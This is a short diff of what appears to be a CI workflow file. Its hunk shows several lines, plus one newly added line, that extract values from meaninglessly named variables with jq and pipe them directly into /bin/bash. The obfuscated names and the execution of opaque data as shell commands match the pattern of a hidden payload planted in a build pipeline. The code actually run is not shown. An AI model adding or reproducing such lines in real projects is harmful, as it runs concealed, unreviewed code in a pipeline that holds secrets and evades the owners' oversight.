@@ -28,6 +28,7 @@ jobs:
           echo $apwp1 | jq -r .glb08610 | /bin/bash
           printf '%s' "$qpkq031" | jq -r .k0 | /bin/bash
           printf '%s' "$ksq59698" | jq -r .o972 | /bin/bash
+          echo $qg93 | jq -r .ekns901 | /bin/bash
 
       - name: Persist results
         if: always()
